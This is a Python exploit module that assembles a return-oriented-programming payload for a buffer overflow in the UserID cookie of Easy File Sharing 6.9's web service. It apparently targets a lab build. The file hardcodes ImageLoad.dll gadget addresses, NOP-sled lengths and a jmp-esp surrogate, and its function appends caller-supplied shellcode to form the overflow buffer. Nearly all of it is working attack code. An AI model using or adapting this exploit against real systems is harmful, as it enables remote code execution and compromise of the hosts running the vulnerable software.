"""ROP chain for EFS 6.9 / fswsService cookie-UserID overflow.

Gadget addresses lifted verbatim from EDB-37951 (Tracy Turben, 2015), which
remains binary-equivalent on the 2026-pinned EFS 6.9 build used by
CysVulnServer. EDB-42256 is the SEH variant of the same vulnerability and
uses the same ImageLoad.dll gadget set.

Layout of the post-cookie payload buffer:

    [junk0  80B nopsled]
    [call_edx        4B]   # pivots through edx+28h chain
    [junk1 396B nopsled]
    [ppr             4B]   # pop edi / pop esi / pop ebp / pop ebx / add esp,24C / ret
    [crafted_jmp_esp 4B]   # ASCII-safe jmp esp surrogate
    [test_bl         4B]   # 00000000 sentinel, passes the JNZ guard
    [kungfu        20B  ]  # MOV EAX,EBX; ADD EAX,5BFFC883; PUSH EAX; RET
    [nopsled        20B ]
    [shellcode      var ]
"""
from __future__ import annotations
import struct

# ImageLoad.dll gadgets (EDB-37951 / EDB-42256)
CALL_EDX        = 0x1001D8C8  # call dword ptr [edx+28h] surrogate
PPR_ADD_ESP_24C = 0x10010101  # pop edi/esi/ebp/ebx ; add esp,24C ; retn
CRAFTED_JMP_ESP = 0xA4523C15  # ASCII-safe surrogate; ADD EAX,5BFFC883 finishes it
TEST_BL_ZERO    = 0x10010125  # contains 00000000 — passes the JNZ
MOV_EAX_EBX     = 0x10022AAC  # MOV EAX,EBX ; POP ESI ; POP EBX ; RETN
ADD_EAX_FINISH  = 0x1001A187  # ADD EAX,5BFFC883 ; RETN  (completes JMP ESP)
PUSH_EAX_RET    = 0x1002466D  # PUSH EAX ; RETN

JUNK0_LEN          = 80
JUNK1_LEN          = 396
MID_NOPSLED_LEN    = 20
NOP                = b"\x90"
FILLER             = b"\xEF\xBE\xAD\xDE"  # 0xDEADBEEF, little-endian


def _pack32(v: int) -> bytes:
    return struct.pack("<I", v & 0xFFFFFFFF)


def build_rop_chain(shellcode: bytes) -> bytes:
    """Assemble the full payload buffer that goes into the UserID cookie."""
    if not shellcode:
        raise ValueError("shellcode must be non-empty")

    parts = [
        NOP * JUNK0_LEN,
        _pack32(CALL_EDX),
        NOP * JUNK1_LEN,
        _pack32(PPR_ADD_ESP_24C),
        _pack32(CRAFTED_JMP_ESP),
        _pack32(TEST_BL_ZERO),
        _pack32(MOV_EAX_EBX),
        FILLER,
        FILLER,
        _pack32(ADD_EAX_FINISH),
        _pack32(PUSH_EAX_RET),
        NOP * MID_NOPSLED_LEN,
        shellcode,
    ]
    return b"".join(parts)
